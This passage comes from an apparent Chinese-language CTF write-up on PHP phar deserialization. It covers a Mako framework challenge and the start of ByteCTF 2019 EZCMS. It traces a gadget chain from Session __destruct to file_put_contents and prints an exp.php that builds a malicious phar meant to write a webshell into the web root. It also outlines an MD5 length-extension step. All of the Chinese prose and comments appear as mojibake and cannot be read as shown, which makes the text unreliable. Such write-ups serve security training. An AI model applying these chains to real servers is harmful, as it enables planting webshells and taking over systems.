= <span class="variable language_">$this</span>-&gt;request-&gt;<span class="title function_ invoke__">getFiles</span>()-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;image&#x27;</span>);</span><br><span class="line">		<span class="variable">$fileName</span> = <span class="variable">$imageFile</span>-&gt;<span class="title function_ invoke__">getReportedFilename</span>();<span class="comment">//è·å–fileNameçš„ä¸€ä¸ªå‡½æ•°ï¼Œè¿™é‡Œæ˜¯è¯»å–imageFileçš„æ–‡ä»¶åå¹¶èµ‹å€¼ç»™fileName</span></span><br><span class="line">		<span class="variable">$imageFile</span>-&gt;<span class="title function_ invoke__">moveTo</span>(<span class="variable">$fileName</span>);</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;response-&gt;<span class="title function_ invoke__">getHeaders</span>()-&gt;<span class="title function_ invoke__">add</span>(<span class="string">&#x27;Location&#x27;</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">	&#125;<span class="comment">//å°±è¿™ä¸ªå‡½æ•°ï¼Œè¦æ˜¯æ•é”ä¸€äº›ï¼Œåº”è¯¥å°±èƒ½çŒœåˆ°fileNameå¯æ§ï¼Œé‚£ä¹ˆå°±è¦æ‰¾è§¦å‘ç‚¹ï¼Œæ¥ç€å®¡ã€‚</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">editGet</span>(<span class="params">ViewFactory <span class="variable">$view</span></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">		<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;/var/www/mako/uploads&#x27;</span>);</span><br><span class="line">		<span class="variable">$fileName</span> = <span class="variable language_">$this</span>-&gt;request-&gt;<span class="title function_ invoke__">getQuery</span>()-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;filename&#x27;</span>);</span><br><span class="line">		<span class="variable">$image</span> = <span class="keyword">new</span> <span class="title class_">Image</span>(<span class="variable">$fileName</span>, <span class="keyword">new</span> <span class="title class_">ImageMagick</span>());<span class="comment">//å¯æ§çš„filename,è¿™é‡Œå¯ä»¥ç”¨æ¥è§¦å‘phar</span></span><br><span class="line">		<span class="variable">$dimensions</span> = <span class="variable">$image</span>-&gt;<span class="title function_ invoke__">getDimensions</span>();</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;view-&gt;<span class="title function_ invoke__">assign</span>(<span class="string">&#x27;fileName&#x27;</span>, <span class="variable">$fileName</span>);</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;view-&gt;<span class="title function_ invoke__">assign</span>(<span class="string">&#x27;dimensions&#x27;</span>, <span class="variable">$dimensions</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$view</span>-&gt;<span class="title function_ invoke__">render</span>(<span class="string">&#x27;edit&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">editPost</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;/var/www/mako/uploads&#x27;</span>);</span><br><span class="line">		<span class="variable">$post</span> = <span class="variable language_">$this</span>-&gt;request-&gt;<span class="title function_ invoke__">getPost</span>();</span><br><span class="line">		<span class="variable">$fileName</span> = <span class="variable">$post</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;filename&#x27;</span>);</span><br><span class="line">		<span class="variable">$degrees</span> = <span class="variable">$post</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;degrees&#x27;</span>);</span><br><span class="line">		<span class="variable">$image</span> = <span class="keyword">new</span> <span class="title class_">Image</span>(<span class="variable">$fileName</span>, <span class="keyword">new</span> <span class="title class_">ImageMagick</span>());</span><br><span class="line">		<span class="variable">$image</span>-&gt;<span class="title function_ invoke__">rotate</span>(<span class="variable">$degrees</span>);</span><br><span class="line">		<span class="variable">$image</span>-&gt;<span class="title function_ invoke__">save</span>();</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;response-&gt;<span class="title function_ invoke__">getHeaders</span>()-&gt;<span class="title function_ invoke__">add</span>(<span class="string">&#x27;Location&#x27;</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œæ¥è¯´ä¸€ä¸‹fileNameä¸ºå•¥æ˜¯å¯æ§çš„,åœ¨Imageæ„é€ å‡½æ•°ä¸­å­˜åœ¨file_exists()æ¥è§¦å‘ï¼ŒåŒæ—¶åœ¨ediGetä¸­filenameè¿›è¡Œgetè®¿é—®ï¼Œå³å¯ç”¨æ¥è§¦å‘phar</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221008212336541-166727395787417.png" alt="test03"></p>
<p>é‚£ä¹ˆæ¥ä¸‹æ¥å°±æ˜¯æŒ–é“¾å­äº†ï¼Œ</p>
<p>åˆæ­¥å®¡ä¸‹æ¥ï¼Œæˆ‘è¿™é‡Œå°±ç›´æ¥ç”¨maxzedçš„é“¾å­äº†ï¼Œæˆ‘å°±è§£è¯»ä¸€ä¸‹ä»–ä¸ºå•¥ä¼šç”¨è¿™ä¸ªé“¾å­</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Session.<span class="title function_ invoke__">__destruct</span>().<span class="title function_ invoke__">commit</span>()-&gt;</span><br><span class="line">File.<span class="title function_ invoke__">write</span>()-&gt;</span><br><span class="line">FileSystem.<span class="title function_ invoke__">put</span>()</span><br></pre></td></tr></table></figure>
<p>åœ¨Session.phpä¸­çš„__destruct(),å…·æœ‰è‡ªåŠ¨æäº¤ä¼šè¯æ•°æ®çš„commit,æ•°æ®ä¼ åˆ°File</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">commit</span>(<span class="params"></span>): <span class="title">void</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="comment">// Replace old flash data with new</span></span><br><span class="line"></span><br><span class="line">		<span class="variable language_">$this</span>-&gt;sessionData[<span class="string">&#x27;mako.flashdata&#x27;</span>] = <span class="variable language_">$this</span>-&gt;flashData;<span class="comment">//</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">// Write session data</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;destroyed)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;store-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;sessionId, <span class="variable">$this</span>-&gt;sessionData, <span class="variable">$this</span>-&gt;options[<span class="string">&#x27;data_ttl&#x27;</span>]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>åœ¨File.write()ä¸­å­˜åœ¨å†™å…¥åŠŸèƒ½ç‚¹ï¼Œé“¾å­åˆ©ç”¨çš„å°±æ˜¯è¿™ä¸ªï¼Œæ¥ç€çœ‹ä¸‹ä¸€ä¸ªåŠŸèƒ½ç‚¹ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$sessionId</span>, <span class="keyword">array</span> <span class="variable">$sessionData</span>, <span class="keyword">int</span> <span class="variable">$dataTTL</span></span>): <span class="title">void</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;fileSystem-&gt;<span class="title function_ invoke__">isWritable</span>(<span class="variable">$this</span>-&gt;sessionPath))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;fileSystem-&gt;<span class="title function_ invoke__">put</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">sessionFile</span>(<span class="variable">$sessionId</span>), <span class="title function_ invoke__">serialize</span>(<span class="variable">$sessionData</span>)) === <span class="literal">false</span> ? <span class="literal">false</span> : <span class="literal">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>fileSystem.phpä¸­çš„put()</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">put</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$file</span>, <span class="variable">$data</span>, <span class="keyword">bool</span> <span class="variable">$lock</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="variable">$data</span>, <span class="variable">$lock</span> ? LOCK_EX : <span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>file_put_contents():</p>
<p>åŠŸèƒ½ï¼šæŠŠä¸€ä¸ªå­—ç¬¦ä¸²å†™å…¥æ–‡ä»¶ä¸­ã€‚</p>
<p>è¯­æ³•ï¼š<code>file_put_contents(file,data,mode,context)</code></p>
<p>å‚æ•°è¯´æ˜ï¼š</p>
<table>
<thead>
<tr>
<th>å‚æ•°</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody>
<tr>
<td><em>file</em></td>
<td>å¿…éœ€ã€‚è§„å®šè¦å†™å…¥æ•°æ®çš„æ–‡ä»¶ã€‚å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™åˆ›å»ºä¸€ä¸ªæ–°æ–‡ä»¶ã€‚</td>
</tr>
<tr>
<td><em>data</em></td>
<td>å¯é€‰ã€‚è§„å®šè¦å†™å…¥æ–‡ä»¶çš„æ•°æ®ã€‚å¯ä»¥æ˜¯å­—ç¬¦ä¸²ã€æ•°ç»„æˆ–æ•°æ®æµã€‚</td>
</tr>
<tr>
<td><em>mode</em></td>
<td>å¯é€‰ã€‚è§„å®šå¦‚ä½•æ‰“å¼€/å†™å…¥æ–‡ä»¶ã€‚å¯èƒ½çš„å€¼ï¼šFILE_USE_INCLUDE_PATHFILE_APPENDLOCK_EX</td>
</tr>
<tr>
<td><em>context</em></td>
<td>å¯é€‰ã€‚è§„å®šæ–‡ä»¶å¥æŸ„çš„ç¯å¢ƒã€‚<em>context</em> æ˜¯ä¸€å¥—å¯ä»¥ä¿®æ”¹æµçš„è¡Œä¸ºçš„é€‰é¡¹ã€‚è‹¥ä½¿ç”¨ nullï¼Œåˆ™å¿½ç•¥</td>
</tr>
</tbody>
</table>
<p>å‚æ•° <em>data</em> å¯ä»¥æ˜¯æ•°ç»„ï¼ˆä½†ä¸èƒ½æ˜¯å¤šç»´æ•°ç»„ï¼‰ã€‚</p>
<p>è‡ª PHP 5.1.0 èµ·ï¼Œ<em>data</em> å‚æ•°ä¹Ÿå¯ä»¥è¢«æŒ‡å®šä¸º stream èµ„æºï¼Œstream ä¸­æ‰€ä¿å­˜çš„ç¼“å­˜æ•°æ®å°†è¢«å†™å…¥åˆ°æŒ‡å®šæ–‡ä»¶ä¸­ï¼Œè¿™ç§ç”¨æ³•å°±ç›¸ä¼¼äºä½¿ç”¨ stream_copy_to_stream() å‡½æ•°ã€‚</p>
<p>å¯¹ <em>context</em> å‚æ•°çš„æ”¯æŒæ˜¯ PHP 5.0.0 æ·»åŠ çš„ã€‚</p>
<hr>
<p>è¿™é‡Œå°±å¯ä»¥åˆ©ç”¨å°†æˆ‘ä»¬æƒ³å†™å…¥çš„æ•°æ®å†™è¿›å®¹å™¨ä¸­ï¼Œç†è®ºæˆç«‹ï¼Œå®è·µå¼€å§‹ï¼Œæˆ‘è¿™é‡Œå°±ç›´æ¥ç”¨maxzedçš„expå•¦ï¼Œå°†shellå†™åœ¨/var/www/mako/publicä¸‹ã€‚</p>
<p>exp.php:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      <span class="meta">?&gt;</span><span class="string">&#x27;);//ç”±äºè¦å­˜æœ¬åœ°ï¼Œè¿™ä¸ªå…ˆå’Œè°ä¸€ä¸‹</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">namespace mako\session\stores&#123;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    use mako\file\FileSystem;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    class File&#123;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">        protected $fileSystem;</span></span><br><span class="line"><span class="string">        protected $sessionPath;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">        public function __construct()</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            $this-&gt;fileSystem = new FileSystem();</span></span><br><span class="line"><span class="string">            $this-&gt;sessionPath = &quot;/var/www/mako/public&quot;;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">namespace mako\file&#123;</span></span><br><span class="line"><span class="string">    class FileSystem&#123;</span></span><br><span class="line"><span class="string">        public function __construct()</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">namespace &#123;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    use mako\session\Session;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    $phar = new Phar(&quot;phar.phar&quot;); //åç¼€åå¿…é¡»ä¸ºphar</span></span><br><span class="line"><span class="string">    $phar-&gt;startBuffering();</span></span><br><span class="line"><span class="string">    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //è®¾ç½®stub</span></span><br><span class="line"><span class="string">    $o = new Session();</span></span><br><span class="line"><span class="string">    $phar-&gt;setMetadata($o); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span></span><br><span class="line"><span class="string">    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;asd&quot;); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line"><span class="string">//ç­¾åè‡ªåŠ¨è®¡ç®—</span></span><br><span class="line"><span class="string">    $phar-&gt;stopBuffering();</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
<p>æ¥ä¸‹æ¥å°±æ˜¯å¸¸è§„è·å–shelläº†ï¼Œä½†æ˜¯æˆ‘è‡ªå·±æœ¬åœ°æ­çš„dockerä¼ ä¸Šå»çš„phar.pharæ²¡ååº”ï¼Œæ²¡æ³•è¯»å–ï¼Œæ²¡èƒ½å¤ç°æˆåŠŸã€‚<s>è¢«è¿«æ¢é¢˜è¯´</s></p>
<h4 id="byte2019ezcms"><a class="markdownIt-Anchor" href="#byte2019ezcms"></a> Byte2019EZCMS</h4>
<p>é¢˜ç›®é¶åœºï¼š[NSSCTF - <a href="https://www.ctfer.vip/problem/190">ByteCTF 2019]EZCMS (ctfer.vip)</a></p>
<p>é¢˜ç›®è€ƒç‚¹ï¼šæºç æ³„éœ²ã€MD5é•¿åº¦æ”»å‡»ã€pharååºåˆ—åŒ–</p>
<h5 id="è§£é¢˜è¿‡ç¨‹"><a class="markdownIt-Anchor" href="#è§£é¢˜è¿‡ç¨‹"></a> è§£é¢˜è¿‡ç¨‹ï¼š</h5>
<p>â€‹      æ‹¿åˆ°é¢˜ç›®ï¼Œæ‰«äº†ä¸€ä¸‹ç›®å½•ï¼Œå‘ç°å­˜åœ¨www.zipï¼Œè®¿é—®www.zipè·å¾—æºç  ï¼Œåˆ†ææºç </p>
<p>index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="variable">$username</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$username</span>);</span><br><span class="line">    <span class="variable">$password</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$password</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$password</span> === <span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;u r not admin !!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;password&#x27;</span>] = <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">login</span>())&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;script&gt;location.href=&quot;upload.php&quot;;&lt;/script&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>â€‹    è¿™é‡Œå°±æ˜¯ï¼Œåªè¦passworä¸æ˜¯adminéƒ½å¯ä»¥ç™»å½•è¿›å»ï¼Œä½†æ˜¯ç™»å½•è¿›å»å´ä¸èƒ½ä¸Šä¼ æ–‡ä»¶</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221009185109443-166727395787418.png" alt="test05"></p>
<p>åˆ°è¿™å„¿ï¼Œå°±å¾—å»æ•´ä½“åˆ†ææºç äº†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;ie=edge&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;EzCMS&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;Upload platform&lt;/h2&gt;</span><br><span class="line">&lt;div&gt;</span><br><span class="line">    &lt;p&gt;å‡è£…è¿™è¿˜æ˜¯ä¸ªæ— æ•Œç‚«é…·çš„å‰ç«¯&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">&quot;upload.php&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">    &lt;label <span class="keyword">for</span>=<span class="string">&quot;file&quot;</span>&gt;æ–‡ä»¶åï¼š&lt;/label&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> id=<span class="string">&quot;file&quot;</span>&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;upload&quot;</span> value=<span class="string">&quot;æäº¤&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> (<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file_tmp</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_size</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_error</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$file_error</span> &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;something error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$admin</span> = <span class="keyword">new</span> <span class="title class_">Admin</span>(<span class="variable">$file_name</span>, <span class="variable">$file_tmp</span>, <span class="variable">$file_size</span>);</span><br><span class="line">    <span class="variable">$admin</span>-&gt;<span class="title function_ invoke__">upload_file</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="string">&#x27;sandbox/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$sandbox</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_file</span>(<span class="variable">$sandbox</span>.<span class="string">&#x27;/.htaccess&#x27;</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$sandbox</span>.<span class="string">&#x27;/.htaccess&#x27;</span>, <span class="string">&#x27;lolololol, i control all&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;view my file : &quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="variable">$path</span> = <span class="string">&quot;./&quot;</span>.<span class="variable">$sandbox</span>;</span><br><span class="line">    <span class="variable">$dir</span> = <span class="title function_ invoke__">opendir</span>(<span class="variable">$path</span>);</span><br><span class="line">    <span class="keyword">while</span> ((<span class="variable">$filename</span> = <span class="title function_ invoke__">readdir</span>(<span class="variable">$dir</span>)) !== <span class="literal">false</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$filename</span> != <span class="string">&#x27;.&#x27;</span> &amp;&amp; <span class="variable">$filename</span> != <span class="string">&#x27;..&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable">$files</span>[] = <span class="variable">$filename</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$k</span>=&gt;<span class="variable">$v</span>)&#123;</span><br><span class="line">        <span class="variable">$filepath</span> = <span class="variable">$path</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$v</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">        &lt;div style=&quot;width: 1000px; height: 30px;&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;Ariel&gt;filename: <span class="subst">&#123;$v&#125;</span>&lt;/Ariel&gt;</span></span><br><span class="line"><span class="string">        &lt;a href=&quot;view.php?filename=<span class="subst">&#123;$v&#125;</span>&amp;filepath=<span class="subst">&#123;$filepath&#125;</span>&quot;&gt;view detail&lt;/a&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br><span class="line"><span class="string">EOF</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">closedir</span>(<span class="variable">$dir</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åœ¨index.phpé‡Œï¼Œæˆ‘ä»¬ä¼ å…¥usernameå’Œpasswordï¼Œå¯†ç ä¸èƒ½ä¸ºadminå³å¯æ­£å¸¸ç™»å½•ï¼Œèµ‹å€¼ç»™sessionæ¥ä¸‹æ¥è°ƒç”¨äº†login()å‡½æ•°</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$secret</span> = <span class="string">&quot;********&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;hash&quot;</span>, <span class="title function_ invoke__">md5</span>(<span class="variable">$secret</span>.<span class="string">&quot;adminadmin&quot;</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>loginå‡½æ•°å°†å¯†é’¥å’Œadminadminæ‹¼æ¥ã€‚ç„¶åMD5åŠ å¯†ã€‚èµ‹å€¼ç»™cookies[â€˜hashâ€™]<br>
ä¹Ÿå°±æ˜¯è¯´ã€‚æˆ‘ä»¬ç™»é™†æˆåŠŸåã€‚ä¼šæœ‰ä¸€ä¸ªcookie hash:md5(å¯†é’¥+â€˜adminadminâ€™)<br>
ç»§ç»­å¾€ä¸‹çœ‹ã€‚ç™»é™†æˆåŠŸåã€‚ä¼šåˆ°uploadé¡µé¢ã€‚ä¸Šä¼ æ–‡ä»¶æ˜¾ç¤ºä¸æ˜¯adminã€‚é‚£ä¹ˆæˆ‘ä»¬å°±ç€é‡çœ‹ä¸‹è¿™éƒ¨åˆ†ä»£ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file_tmp</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_size</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_error</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line">    <span class="comment">//ä¸Šä¼ ä¸­çš„ä¸€äº›æ“ä½œï¼Œç»™å˜é‡èµ‹å€¼å•¥çš„ã€‚</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$file_error</span> &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;something error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$admin</span> = <span class="keyword">new</span> <span class="title class_">Admin</span>(<span class="variable">$file_name</span>, <span class="variable">$file_tmp</span>, <span class="variable">$file_size</span>);</span><br><span class="line">    <span class="variable">$admin</span>-&gt;<span class="title function_ invoke__">upload_file</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="string">&#x27;sandbox/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$sandbox</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œç¨‹åºè°ƒç”¨äº†adminç±»ä¸­çš„upload_fileåŠŸèƒ½ï¼Œæ¥ç€å¾€ä¸‹çœ‹</p>
